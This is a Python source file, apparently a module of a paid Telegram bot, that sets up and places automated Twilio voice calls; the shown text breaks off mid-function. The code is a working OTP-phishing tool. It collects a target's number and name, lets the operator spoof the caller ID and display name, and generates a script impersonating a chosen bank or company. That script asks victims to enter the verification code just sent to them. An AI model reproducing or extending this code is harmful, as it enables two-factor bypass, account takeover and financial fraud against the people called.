"""
handlers/call_flow.py – Professional Normal Calling (Ultimate Edition)

Features:
- 9-step guided setup with validation.
- Single professional verification script for Normal Call flows.
- Async AMD (voicemail/robot detection) – automatically hangs up on machines.
- Real-time Telegram notifications for every call event.
- Script preview, voice preview, caller ID validation, scheduling.
- Legacy variant support: if custom script contains '||', only the first variant is used.
- Call history logging (per-user JSON file).
"""

import re
import logging
import json
from datetime import datetime, timedelta
import time
from pathlib import Path
from typing import Optional, Dict, List, Tuple, Union

try:
    from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
    from telegram.ext import ContextTypes, ConversationHandler
    PTB_AVAILABLE = True
except Exception:
    # Allow the module to be imported in environments without python-telegram-bot
    from typing import Any

    Update = Any
    InlineKeyboardButton = None
    InlineKeyboardMarkup = None
    ContextTypes = Any
    ConversationHandler = None
    PTB_AVAILABLE = False

from config import TWILIO_PHONE_NUMBER, NGROK_URL, USE_AI_FLOW, build_public_base_url, DEFAULT_VOICE_ID
from urllib.parse import quote_plus
from core.files import (
    read_user_file, write_user_file, set_user_state, get_user_state,
    clear_user_state, ensure_user_path, user_conf_path
)
from core.auth import (
    check_subscription, is_privileged_user, decrement_free_call,
    get_free_calls
)
from services.twilio_service import make_call, make_call_and_store_async, store_call_metadata, get_twilio_client
from services.proxy_pool import AllLinesBusyError

# ======================================================================
# SCENARIOS & URGENCY (drives PromptBuilder Stage 2 reason + tone)
# ======================================================================

SCENARIOS = {
    "bank": "🏦 Bank/Financial",
    "crypto": "💰 Crypto Exchange",
    "ecommerce": "🛒 E-commerce",
    "email": "📧 Email Provider",
    "payment": "💳 Payment Service",
    "social": "📱 Social Media",
    "corporate": "🏢 Corporate",
    "other": "🛡️ Other",
}

URGENCIES = {
    "high": "🔴 High",
    "medium": "🟡 Medium",
    "low": "🟢 Low",
}


def get_voice_mapping() -> dict:
    """Return the authoritative voice mapping from bot.py (populated at runtime)."""
    try:
        from bot import VOICE_MAPPING as BOT_VOICE_MAPPING
        if BOT_VOICE_MAPPING and isinstance(BOT_VOICE_MAPPING, dict):
            return BOT_VOICE_MAPPING
    except Exception:
        pass
    return {}
from menu import send_main_menu

logger = logging.getLogger(__name__)

# AMD/detection handling removed: project no longer includes DetectionPriority or MachineHandler.


# Compatibility with existing telebot-based code (non-breaking placeholders).
_telebot_instance = None

def init_bot(bot):
    """Compatibility: store telebot instance if the older code injects it."""
    global _telebot_instance
    _telebot_instance = bot
def _match_scenario_key(text: str):
    """Resolve a free-text reply to a scenario key (key, label prefix, or alias)."""
    t = text.strip().lower()
    for key in SCENARIOS:
        if t == key:
            return key
    label_map = {
        "bank": "bank", "financial": "bank", "banking": "bank",
        "crypto": "crypto", "cryptocurrency": "crypto",
        "ecommerce": "ecommerce", "e-commerce": "ecommerce", "shop": "ecommerce",
        "email": "email", "mail": "email",
        "payment": "payment", "payments": "payment",
        "social": "social", "social media": "social",
        "corporate": "corporate", "company": "corporate", "business": "corporate",
        "other": "other", "generic": "other", "default": "other",
    }
    return label_map.get(t)


def _match_urgency_key(text: str):
    """Resolve a free-text reply to an urgency key."""
    t = text.strip().lower()
    if t in ("high", "urgent", "h"):
        return "high"
    if t in ("medium", "med", "normal", "m"):
        return "medium"
    if t in ("low", "relaxed", "l"):
        return "low"
    return None


def _scenario_keyboard():
    from telebot import types as tb_types
    kb = tb_types.InlineKeyboardMarkup(row_width=2)
    for key, label in SCENARIOS.items():
        kb.add(tb_types.InlineKeyboardButton(label, callback_data=f"normal_scenario_{key}"))
    kb.add(tb_types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_call"))
    return kb


def _urgency_keyboard():
    from telebot import types as tb_types
    kb = tb_types.InlineKeyboardMarkup(row_width=1)
    for key, label in URGENCIES.items():
        kb.add(tb_types.InlineKeyboardButton(label, callback_data=f"normal_urgency_{key}"))
    kb.add(tb_types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_call"))
    return kb


def step0_scenario(chat_id: int, user_id: str = None):
    """Telebot compatibility: start the Normal Call flow with scenario selection."""
    if not _telebot_instance:
        return
    try:
        if user_id:
            ensure_user_path(user_id)
            set_user_state(user_id, "normal_call_step_0_scenario")
        _telebot_instance.send_message(
            chat_id,
            "🎯 VOICE CALL SETUP\n\nStep 1/11: Target Scenario\nSelect the target scenario:",
            reply_markup=_scenario_keyboard(),
        )
    except Exception:
        pass


def step1_name(chat_id: int, user_id: str = None):
    """Backwards-compatible alias for the scenario-first entry point."""
    return step0_scenario(chat_id, user_id)


def select_normal_scenario(call, user_id: str, chat_id: int, message_id: int):
    """Write the chosen scenario and advance to phone step."""
    if not _telebot_instance:
        return
    scenario_key = call.data.replace("normal_scenario_", "")
    if scenario_key not in SCENARIOS:
        return
    write_user_file(user_id, "scenario.txt", scenario_key)
    set_user_state(user_id, "normal_call_step_1_phone")
    _telebot_instance.send_message(
        chat_id,
        f"💠 Step 2/11: Phone Number\n\n🎯 Scenario: {SCENARIOS[scenario_key]}\nEnter target phone number:\n— Example: +1234567890",
    )


def select_normal_urgency(call, user_id: str, chat_id: int, message_id: int):
    """Write the chosen urgency and advance to caller ID step."""
    if not _telebot_instance:
        return
    urgency_key = call.data.replace("normal_urgency_", "")
    if urgency_key not in URGENCIES:
        return
    write_user_file(user_id, "urgency.txt", urgency_key)
    set_user_state(user_id, "normal_call_step_4_callerid")
    name = read_user_file(user_id, "Name.txt", "Customer")
    _telebot_instance.send_message(
        chat_id,
        f"💠 Step 5/11: Caller ID (Optional)\n\n👤 Name: {name}\n⚡ Urgency: {URGENCIES[urgency_key]}\n\nEnter caller ID number:\n— Example: +1234567890\n— Or send /skip to use the default Twilio number",
    )


def show_preview_and_confirm_compat(chat_id: int, user_id: str):
    """Telebot-compatible: show the script summary and action buttons.

    This mirrors `show_preview_and_confirm` for the telebot flow.
    """
    if not _telebot_instance:
        return
    try:
        digits = read_user_file(user_id, "Digits.txt", "6")
        script = build_script(user_id, int(digits))

        summary = format_call_summary(user_id)

        from telebot import types as tb_types
        kb = tb_types.InlineKeyboardMarkup(row_width=2)
        kb.add(tb_types.InlineKeyboardButton("📞 INITIATE CALL", callback_data="normal_confirm"))
        kb.add(tb_types.InlineKeyboardButton("📅 Schedule", callback_data="normal_schedule"))
        kb.add(tb_types.InlineKeyboardButton("❌ Cancel", callback_data="cancel_call"))

        _telebot_instance.send_message(
            chat_id,
            f"{summary}\n\n`     Tap INITIATE CALL to start.     `",
            reply_markup=kb,
            parse_mode="Markdown",
        )
    except Exception:
        try:
            _telebot_instance.send_message(chat_id, "✅ Voice selected. Use INITIATE CALL when ready.")
        except Exception:
            pass

def handle_normal_step(chat_id: int, user_id: str, state: str, text: str):
    """Handle legacy telebot-style normal call steps.

    Returns True if the message was handled (so caller can return), False for validation failure,
    or None if `state` is not a normal call state.
    """
    if not _telebot_instance:
        return None

    if state == "normal_call_step_0_scenario":
        key = _match_scenario_key(text.strip())
        if not key:
            _telebot_instance.send_message(chat_id, "❌ Scenario not recognized. Tap a scenario button above.")
            return False
        write_user_file(user_id, "scenario.txt", key)
        set_user_state(user_id, "normal_call_step_1_phone")
        _telebot_instance.send_message(chat_id, f"💠 Step 2/11: Phone Number\n\n🎯 Scenario: {SCENARIOS[key]}\nEnter target phone number:\n— Example: +1234567890")
        return True

    if state == "normal_call_step_1_phone":
        phone = format_phone(text.strip())
        if not phone or len(re.sub(r'\D', '', phone)) < 10:
            _telebot_instance.send_message(chat_id, "❌ Invalid phone format. Use +1234567890")
            return False
        write_user_file(user_id, "phonenum.txt", phone)
        set_user_state(user_id, "normal_call_step_2_name")
        scenario = read_user_file(user_id, "scenario.txt", SCENARIOS["other"])
        _telebot_instance.send_message(chat_id, f"💠 Step 3/11: Target Information\n\n🎯 Scenario: {scenario}\n📞 Phone: {phone}\nEnter the target's full name:\n— Example: John Smith")
        return True

    if state == "normal_call_step_2_name":
        if not text.strip():
            _telebot_instance.send_message(chat_id, "❌ Name cannot be empty.")
            return False
        write_user_file(user_id, "Name.txt", text.strip())
        set_user_state(user_id, "normal_call_step_3_urgency")
        _telebot_instance.send_message(chat_id, f"💠 Step 4/11: Urgency Level\n\n👤 Name: {text.strip()}\nSet urgency level:", reply_markup=_urgency_keyboard())
        return True

    if state == "normal_call_step_3_urgency":
        key = _match_urgency_key(text.strip())
        if not key:
            _telebot_instance.send_message(chat_id, "❌ Reply HIGH, MEDIUM, or LOW.")
            return False
        write_user_file(user_id, "urgency.txt", key)
        set_user_state(user_id, "normal_call_step_4_callerid")
        name = read_user_file(user_id, "Name.txt", "Customer")
        _telebot_instance.send_message(chat_id, f"💠 Step 5/11: Caller ID (Optional)\n\n👤 Name: {name}\n⚡ Urgency: {URGENCIES[key]}\n\nEnter caller ID number:\n— Example: +1234567890\n— Or send /skip to use the default Twilio number")
        return True

    if state == "normal_call_step_4_callerid":
        caller_input = text.strip()
        # accept leading slash commands like '/skip' by normalizing
        normalized = caller_input.lstrip('/').strip()
        if normalized.lower() in ("skip", ""):
            caller = ""
            _telebot_instance.send_message(chat_id, f"ℹ️ Caller ID set to default: {TWILIO_PHONE_NUMBER}")
        else:
            caller = format_phone(caller_input)
            if not validate_caller_id(caller):
                _telebot_instance.send_message(chat_id, "❌ Invalid caller ID format. Send +1234567890 or /skip")
                return False
        write_user_file(user_id, "Caller ID.txt", caller)
        set_user_state(user_id, "normal_call_step_5_fromname")
        name = read_user_file(user_id, "Name.txt", "Customer")
        _telebot_instance.send_message(chat_id, f"💠 Step 6/11: Display Name\n\n👤 Name: {name}\n📞 Caller ID: {caller or TWILIO_PHONE_NUMBER}\n\nEnter display name (shown on caller ID):\n— Example: Support Team")
        return True

    if state == "normal_call_step_5_fromname":
        if not text.strip():
            _telebot_instance.send_message(chat_id, "❌ Display name cannot be empty.")
            return False
        write_user_file(user_id, "From Name.txt", text.strip())
        set_user_state(user_id, "normal_call_step_6_company")
        name = read_user_file(user_id, "Name.txt", "Customer")
        _telebot_instance.send_message(chat_id, f"💠 Step 7/11: Company Information\n\n👤 Name: {name}\n🏷️ Display Name: {text.strip()}\nEnter company/bank name:\n— Example: Chase Bank")
        return True

    if state == "normal_call_step_6_company":
        if not text.strip():
            _telebot_instance.send_message(chat_id, "❌ Company cannot be empty.")
            return False
        write_user_file(user_id, "Company Name.txt", text.strip())
        set_user_state(user_id, "normal_call_step_7_language")
        name = read_user_file(user_id, "Name.txt", "Customer")
        company = text.strip()
        _telebot_instance.send_message(chat_id, f"💠 Step 8/11: Language\n\n🏢 Company: {company}\nChoose the call language:\nEN – English\nFR – Français")
        return True

    if state == "normal_call_step_7_language":
        lang = text.strip().lower()
        if lang not in ("en", "fr"):
            _telebot_instance.send_message(chat_id, "❌ Reply EN or FR.")
            return False
        write_user_file(user_id, "Language.txt", lang)
        set_user_state(user_id, "normal_call_step_8_delivery")
        _telebot_instance.send_message(chat_id, "💠 Step 9/11: Delivery Method\n\nHow will the OTP be delivered?\nSMS – Text message\nEMAIL – Email")
        return True

    if state == "normal_call_step_8_delivery":
        delivery = text.strip().lower()
        if delivery not in ("sms", "email"):
            _telebot_instance.send_message(chat_id, "❌ Reply SMS or EMAIL.")
            return False
        write_user_file(user_id, "Delivery.txt", delivery)
        set_user_state(user_id, "normal_call_step_9_digits")
        _telebot_instance.send_message(chat_id, "💠 Step 10/11: OTP Code Length\n\nEnter the number of digits (4-10):\n— Example: 6")
        return True

    if state == "normal_call_step_9_digits":
        if not text.strip().isdigit() or not (4 <= int(text.strip()) <= 10):
            _telebot_instance.send_message(chat_id, "❌ Enter a number between 4 and 10.")
            return False
        write_user_file(user_id, "Digits.txt", text.strip())
        write_user_file(user_id, "CodeLength.txt", text.strip())
        set_user_state(user_id, "normal_call_step_10_voice")
        vm = get_voice_mapping()
        lines = [
            "🎤 Step 11/11: Voice Selection",
            "",
            "Reply with the number or name to select a voice.",
            "",
        ]
        for key, voice in sorted(vm.items(), key=lambda item: int(item[0])):
            desc = voice.get("desc") or "No description available"
            lines.append(f"{key}. {voice.get('name')} — {desc}")
        _telebot_instance.send_message(chat_id, "\n".join(lines))
        return True

    if state == "normal_call_step_10_voice":
        choice = text.strip()
        found = False
        voice_id = None
        voice_name = None
        vm = get_voice_mapping()
        if choice in vm:
            voice_id = vm[choice]["id"]
            voice_name = vm[choice]["name"]
            found = True
        else:
            for _, v in vm.items():
                if v.get('name', '').lower() == choice.lower():
                    voice_id = v.get('id')
                    voice_name = v.get('name')
                    found = True
                    break
        if not found:
            _telebot_instance.send_message(chat_id, "❌ Voice not recognized. Reply with number or full name.")
            return False
        provider_key = choice if choice in vm else next((k for k, v in vm.items() if v.get('name', '').lower() == choice.lower()), None)
        voice_provider = vm[provider_key].get("provider", "vapi") if provider_key else "vapi"
        write_user_file(user_id, "Voice.txt", voice_id)
        write_user_file(user_id, "VoiceName.txt", voice_name)
        write_user_file(user_id, "VoiceProvider.txt", voice_provider)
        clear_user_state(user_id)
        # show preview and confirm
        try:
            show_preview_and_confirm_compat(chat_id, user_id)
        except Exception:
            _telebot_instance.send_message(chat_id, "✅ Voice selected. Use INITIATE CALL when ready.")
        return True

    return None


# Conversation states (maintain scenario-first flow: scenario → phone → name → urgency
# → caller id → display name → company → language → delivery → digits → voice)
(
    NORMAL_SCENARIO,
    NORMAL_PHONE,
    NORMAL_NAME,
    NORMAL_URGENCY,
    NORMAL_CALLER_ID,
    NORMAL_FROM_NAME,
    NORMAL_COMPANY,
    NORMAL_LANGUAGE,
    NORMAL_DELIVERY,
    NORMAL_DIGITS,
    NORMAL_VOICE,
    NORMAL_PREVIEW,
    NORMAL_SCHEDULE,
    NORMAL_CONFIRM,
) = range(14)


# ======================================================================
# HELPERS
# ======================================================================

def format_phone(phone: str) -> str:
    """Auto-format to E.164 (strip non-digits, add + if missing)."""
    digits = re.sub(r'\D', '', phone)
    if not digits:
        return phone
    if len(digits) == 10:
        return f"+1{digits}"
    if len(digits) == 11 and digits.startswith('1'):
        return f"+{digits}"
    if len(digits) > 11 and not phone.startswith('+'):
        return f"+{digits}"
    return phone


def validate_caller_id(caller_id: str) -> bool:
    """E.164 format check."""
    if not caller_id:
        return True
    return bool(re.match(r'^\+[1-9]\d{7,14}$', caller_id))


def get_script_variant(script: str) -> str:
    """If script contains '||', use only the first variant to keep a single professional path."""
    return script.split('||', 1)[0].strip()


def build_script(user_id: str, digits: int = 6) -> str:
    """
    Generate a single professional Normal Call script.
    This flow uses one focused verification path for human answers.
    """
    name = read_user_file(user_id, "Name.txt", "Customer")
    company = read_user_file(user_id, "Company Name.txt", "your bank")

    return (
        "[GREETING]\n"
        f"Hello, this is {company}.\n"
        f"Am I speaking with {name}?\n\n"
        "We are calling to verify a recent activity on your account and ensure everything is secure.\n\n"
        "[PAUSE_WAIT:1]\n"
        "For your protection, please press 1 to continue.\n\n"
        f"[GATHER:digits={digits}]\n"
        f"A verification code has been sent to your registered phone number. Enter the {digits}-digit code now, then press the pound key.\n\n"
        "[SUCCESS]\n"
        "Thank you. Your account is now verified and secure. Goodbye.\n\n"
        "[FAILURE]\n"
        "The code did not match our records. Please try again."
    )


def estimate_call_cost() -> str:
    return f"${0.013 * 2.0:.3f}"  # ~2 minutes average


def format_call_summary(user_id: str) -> str:
    """Build the CALL READY summary."""
    name = read_user_file(user_id, "Name.txt", "Not set")
    company = read_user_file(user_id, "Company Name.txt", "Not set")
    phone = read_user_file(user_id, "phonenum.txt", "Not set")
    caller_id = read_user_file(user_id, "Caller ID.txt", "Default")
    from_name = read_user_file(user_id, "From Name.txt", "Not set")
    lang = read_user_file(user_id, "Language.txt", "en").upper()
    delivery = read_user_file(user_id, "Delivery.txt", "sms").upper()
    digits = read_user_file(user_id, "Digits.txt", "6")
    voice_name = read_user_file(user_id, "VoiceName.txt", "Hannah (US)")
    scenario_key = read_user_file(user_id, "scenario.txt", "").strip()
    urgency_key = read_user_file(user_id, "urgency.txt", "").strip()
    scenario_label = SCENARIOS.get(scenario_key, "Other")
    urgency_label = URGENCIES.get(urgency_key, "Medium")
    return (
        f"📋 *CALL READY*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"🎯 Scenario: *{scenario_label}*\n"
        f"⚡ Urgency: *{urgency_label}*\n"
        f"👤 Target: *{name}*\n"
        f"🏢 Company: *{company}*\n"
        f"📞 Phone: `{phone}`\n"
        f"📞 Caller ID: `{caller_id}`\n"
        f"📛 Display Name: *{from_name}*\n"
        f"🌐 Language: *{lang}*\n"
        f"📨 Delivery: *{delivery}*\n"
        f"🔢 OTP Length: *{digits}* digits\n"
        f"🎙️ Voice: *{voice_name}*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
        # Script preview omitted from quick summary to avoid exposing full script content in previews
        ""
    )


# ======================================================================
# STEP HANDLERS (Steps 1-9)
# ======================================================================

async def normal_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 1/11: Scenario selection."""
    user_id = str(update.effective_user.id)
    ensure_user_path(user_id)
    set_user_state(user_id, "normal_call_step_0_scenario")
    keyboard = []
    row = []
    for key, label in SCENARIOS.items():
        row.append(InlineKeyboardButton(label, callback_data=f"normal_scenario_{key}"))
        if len(row) >= 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_call")])
    await update.message.reply_text(
        "🎯 *VOICE CALL SETUP*\n\n"
        "Step 1/11: Target Scenario\n"
        "Select the target scenario:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    return NORMAL_SCENARIO


async def normal_scenario(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 1/11 (input): Store scenario, ask for phone."""
    user_id = str(update.effective_user.id)
    msg = None
    if update.callback_query:
        await update.callback_query.answer()
        data = update.callback_query.data.replace("normal_scenario_", "")
        if data not in SCENARIOS:
            await update.callback_query.message.reply_text("❌ Invalid scenario.")
            return NORMAL_SCENARIO
        key = data
        msg = update.callback_query.message
    else:
        text = update.message.text.strip()
        key = _match_scenario_key(text)
        if not key:
            await update.message.reply_text("❌ Scenario not recognized. Tap a scenario button above.")
            return NORMAL_SCENARIO
        msg = update.message
    write_user_file(user_id, "scenario.txt", key)
    set_user_state(user_id, "normal_call_step_1_phone")
    await msg.reply_text(
        f"💠 Step 2/11: Phone Number\n\n"
        f"🎯 Scenario: *{SCENARIOS[key]}*\n"
        f"Enter target phone number:\n"
        f"— Example: +1234567890",
        parse_mode="Markdown"
    )
    return NORMAL_PHONE


async def normal_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 2/11: Phone number, ask for name."""
    user_id = str(update.effective_user.id)
    raw = update.message.text.strip()
    phone = format_phone(raw)
    if not phone or len(re.sub(r'\D', '', phone)) < 10:
        await update.message.reply_text(
            "❌ Invalid phone number. Use format:\n"
            "`+1234567890`\n"
            "Include country code.",
            parse_mode="Markdown"
        )
        return NORMAL_PHONE
    write_user_file(user_id, "phonenum.txt", phone)
    set_user_state(user_id, "normal_call_step_2_name")
    scenario = read_user_file(user_id, "scenario.txt", SCENARIOS["other"])
    await update.message.reply_text(
        f"💠 Step 3/11: Target Information\n\n"
        f"🎯 Scenario: *{scenario}*\n"
        f"📞 Phone: `{phone}`\n"
        f"Enter the target's full name:\n"
        f"— Example: John Smith",
        parse_mode="Markdown"
    )
    return NORMAL_NAME


async def normal_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 3/11: Target name, ask for urgency."""
    user_id = str(update.effective_user.id)
    text = update.message.text.strip()
    if not text:
        await update.message.reply_text("❌ Name cannot be empty.")
        return NORMAL_NAME
    write_user_file(user_id, "Name.txt", text)
    set_user_state(user_id, "normal_call_step_3_urgency")
    keyboard = []
    for key, label in URGENCIES.items():
        keyboard.append([InlineKeyboardButton(label, callback_data=f"normal_urgency_{key}")])
    await update.message.reply_text(
        f"💠 Step 4/11: Urgency Level\n\n"
        f"👤 Name: *{text}*\n"
        f"Set urgency level:",
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    return NORMAL_URGENCY


async def normal_urgency(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 4/11 (input): Store urgency, ask for caller ID."""
    user_id = str(update.effective_user.id)
    msg = None
    if update.callback_query:
        await update.callback_query.answer()
        data = update.callback_query.data.replace("normal_urgency_", "")
        if data not in URGENCIES:
            await update.callback_query.message.reply_text("❌ Invalid urgency.")
            return NORMAL_URGENCY
        key = data
        msg = update.callback_query.message
    else:
        text = update.message.text.strip()
        key = _match_urgency_key(text)
        if not key:
            await update.message.reply_text("❌ Reply HIGH, MEDIUM, or LOW.")
            return NORMAL_URGENCY
        msg = update.message
    write_user_file(user_id, "urgency.txt", key)
    set_user_state(user_id, "normal_call_step_4_callerid")
    name = read_user_file(user_id, "Name.txt", "Customer")
    await msg.reply_text(
        f"💠 Step 5/11: Caller ID (Optional)\n\n"
        f"👤 Name: *{name}*\n"
        f"⚡ Urgency: *{URGENCIES[key]}*\n"
        f"Enter caller ID number:\n"
        f"— Example: +1234567890\n"
        f"— Or send /skip to use the default Twilio number",
        parse_mode="Markdown"
    )
    return NORMAL_CALLER_ID


async def normal_caller_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 5/11: Caller ID, ask for display name."""
    user_id = str(update.effective_user.id)
    text = update.message.text.strip()
    if text.lower() == '/skip' or not text:
        caller_id = ""
        await update.message.reply_text(
            f"ℹ️ Caller ID set to default: `{TWILIO_PHONE_NUMBER}`",
            parse_mode="Markdown"
        )
    else:
        caller_id = format_phone(text)
        if not validate_caller_id(caller_id):
            await update.message.reply_text(
                "❌ Invalid caller ID format. Use E.164 format:\n"
                "`+1234567890`\n"
                "Or send /skip to use default.",
                parse_mode="Markdown"
            )
            return NORMAL_CALLER_ID
    write_user_file(user_id, "Caller ID.txt", caller_id)
    set_user_state(user_id, "normal_call_step_5_fromname")
    name = read_user_file(user_id, "Name.txt", "Customer")
    await update.message.reply_text(
        f"💠 Step 6/11: Display Name\n\n"
        f"👤 Name: *{name}*\n"
        f"📞 Caller ID: `{caller_id or TWILIO_PHONE_NUMBER}`\n"
        f"Enter display name (shown on caller ID):\n"
        f"— Example: Support Team",
        parse_mode="Markdown"
    )
    return NORMAL_FROM_NAME


async def normal_from_name(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 6/11: Display name, ask for company."""
    user_id = str(update.effective_user.id)
    text = update.message.text.strip()
    if not text:
        await update.message.reply_text("❌ Display name cannot be empty.")
        return NORMAL_FROM_NAME
    write_user_file(user_id, "From Name.txt", text)
    set_user_state(user_id, "normal_call_step_6_company")
    name = read_user_file(user_id, "Name.txt", "Customer")
    await update.message.reply_text(
        f"💠 Step 7/11: Company Information\n\n"
        f"👤 Name: *{name}*\n"
        f"🏷️ Display Name: *{text}*\n"
        f"Enter company/bank name:\n"
        f"— Example: Chase Bank",
        parse_mode="Markdown"
    )
    return NORMAL_COMPANY


async def normal_company(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 7/11: Company, ask for language."""
    user_id = str(update.effective_user.id)
    text = update.message.text.strip()
    if not text:
        await update.message.reply_text("❌ Company cannot be empty.")
        return NORMAL_COMPANY
    write_user_file(user_id, "Company Name.txt", text)
    set_user_state(user_id, "normal_call_step_7_language")
    await update.message.reply_text(
        f"💠 Step 8/11: Language\n\n"
        f"🏢 Company: *{text}*\n"
        f"Choose the call language:\n"
        f"🇺🇸 EN – English\n"
        f"🇫🇷 FR – Français",
        parse_mode="Markdown"
    )
    return NORMAL_LANGUAGE


async def normal_language(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 8/11: Language, ask for delivery."""
    user_id = str(update.effective_user.id)
    text = update.message.text.strip().lower()
    if text not in ['en', 'fr']:
        await update.message.reply_text("❌ Reply with `EN` or `FR`.")
        return NORMAL_LANGUAGE
    write_user_file(user_id, "Language.txt", text)
    set_user_state(user_id, "normal_call_step_8_delivery")
    await update.message.reply_text(
        "💠 Step 9/11: Delivery Method\n\n"
        "How will the OTP be delivered?\n"
        "📱 SMS – Text message\n"
        "📧 EMAIL – Email",
        parse_mode="Markdown"
    )
    return NORMAL_DELIVERY


async def normal_delivery(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 9/11: Delivery, ask for digits."""
    user_id = str(update.effective_user.id)
    text = update.message.text.strip().lower()
    if text not in ['sms', 'email']:
        await update.message.reply_text("❌ Reply with `SMS` or `EMAIL`.")
        return NORMAL_DELIVERY
    write_user_file(user_id, "Delivery.txt", text)
    set_user_state(user_id, "normal_call_step_9_digits")
    await update.message.reply_text(
        "💠 Step 10/11: OTP Code Length\n\n"
        "Enter the number of digits (4‑10):\n"
        "— Example: 6",
        parse_mode="Markdown"
    )
    return NORMAL_DIGITS


async def normal_digits(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Step 10/11: Digits, ask for voice."""
    user_id = str(update.effective_user.id)
    text = update.message.text.strip()
    if not text.isdigit() or not (4 <= int(text) <= 10):
        await update.message.reply_text("❌ Enter a number between 4 and 10.")
        return NORMAL_DIGITS
    write_user_file(user_id, "Digits.txt", text)
    write_user_file(user_id, "CodeLength.txt", text)
    set_user_state(user_id, "normal_call_step_10_voice")
    keyboard = []
    row = []
    vm = get_voice_mapping()
    for key, v in sorted(vm.items(), key=lambda x: x[0]):
        row.append(InlineKeyboardButton(v.get('name', key), callback_data=f"voice_select_{v.get('id', key)}"))
        if len(row) >= 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    voice_lines = [f"{k}. {v.get('name')} — {v.get('desc', '')}" for k, v in sorted(vm.items(), key=lambda x: int(x[0]))]
    await update.message.reply_text(
        "🎤 Step 11/11: Voice Selection\n\n"
        "Choose a voice by tapping a button or replying with number/name.\n\n"
        + "\n".join(voice_lines),
        reply_markup=InlineKeyboardMarkup(keyboard),
        parse_mode="Markdown"
    )
    return NORMAL_VOICE


# ======================================================================
# VOICE CALLBACK & PREVIEW
# ======================================================================

async def normal_voice_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = str(query.from_user.id)
    data = query.data

    if data.startswith('voice_select_'):
        voice_id = data.replace('voice_select_', '')
        vm = get_voice_mapping()
        voice_entry = next((v for v in vm.values() if v['id'] == voice_id), None)
        if not voice_entry:
            await query.edit_message_text("❌ Voice not found.")
            return
        voice_name = voice_entry['name']
        voice_provider = voice_entry.get('provider', 'vapi')
        write_user_file(user_id, "Voice.txt", voice_id)
        write_user_file(user_id, "VoiceName.txt", voice_name)
        write_user_file(user_id, "VoiceProvider.txt", voice_provider)
        clear_user_state(user_id)
        await show_preview_and_confirm(query, user_id)
        return

    elif data == 'normal_confirm':
        await initiate_call_from_query(query, user_id)
        return

    elif data == 'normal_schedule':
        set_user_state(user_id, "normal_schedule")
        await query.edit_message_text(
            "📅 *Schedule Call*\n\n"
            "Send the date and time in this format:\n"
            "`DD/MM/YYYY HH:MM`\n\n"
            "Example: `25/12/2026 14:30`",
            parse_mode="Markdown"
        )
        return NORMAL_SCHEDULE


async def show_preview_and_confirm(query, user_id: str):
    """Show script preview, cost, and action buttons."""
    digits = read_user_file(user_id, "Digits.txt", "6")
    script = build_script(user_id, int(digits))

    keyboard = [
        [InlineKeyboardButton("📞 INITIATE CALL", callback_data="normal_confirm")],
        [
            InlineKeyboardButton("📅 Schedule", callback_data="normal_schedule"),
            InlineKeyboardButton("❌ Cancel", callback_data="cancel_call"),
        ],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    summary = format_call_summary(user_id)
    await query.edit_message_text(
        f"{summary}\n\n"
        f"🔊 *Voice Preview:* ✅ Available (tap below)\n"
        f"🕒 *Scheduled:* Not set\n\n"
        f"Recording will begin as soon as the call starts, and a single professional verification script will play after a human answers.\n"
        f"Tap *INITIATE CALL* to start now, or *Schedule* for later.",
        reply_markup=reply_markup,
        parse_mode="Markdown"
    )


# ======================================================================
# CALL INITIATION WITH VOICEMAIL/HUMAN DETECTION
# ======================================================================

def initiate_call(chat_id: int, user_id: str, call_from_user=None, status_message_id=None, mode_label: Optional[str] = None):
    """Compatibility entry point that delegates to bot.initiate_normal_call.

    Kept as a distinct sync wrapper so the PTB async path (initiate_call_from_query)
    and the live telebot path (initiate_normal_call) remain clearly separated.
    """
    try:
        from bot import initiate_normal_call
        if mode_label is None:
            mode_label = "Normal Call"
        return initiate_normal_call(chat_id, user_id, call_from_user, status_message_id, mode_label)
    except Exception:
        return None


async def initiate_call_from_query(query, user_id: str):
    """Place the call with async AMD and real-time user notifications."""
    chat_id = query.message.chat.id

    if not is_privileged_user(user_id) and check_subscription(user_id) != "ACTIVE":
        remaining = decrement_free_call(user_id)
        if remaining < 0:
            await query.edit_message_text(
                "❌ Free trial exhausted. Please purchase a subscription to make calls."
            )
            return

    voice_id = read_user_file(user_id, "Voice.txt", DEFAULT_VOICE_ID)
    emotion = read_user_file(user_id, "emotion.txt", "neutral")

    name = read_user_file(user_id, "Name.txt", "Customer")
    company = read_user_file(user_id, "Company Name.txt", "your bank")
    digits = read_user_file(user_id, "Digits.txt", "6")
    phone = read_user_file(user_id, "phonenum.txt", "")
    caller_id = read_user_file(user_id, "Caller ID.txt", TWILIO_PHONE_NUMBER)

    try:
        import asyncio
        future = make_call_and_store_async(
            user_id=user_id,
            to=phone,
            from_number=TWILIO_PHONE_NUMBER,
            caller_id=caller_id,
            chat_id=chat_id,
        )
        if not future:
            await query.edit_message_text("❌ Call failed to dispatch. Check Twilio configuration.")
            return
        sid = await asyncio.wrap_future(future)
        if sid:
            store_call_metadata(user_id, sid, target=phone)
            # Save call history to per-user JSON
            history_path = user_conf_path(user_id) / "call_history.json"
            history = []
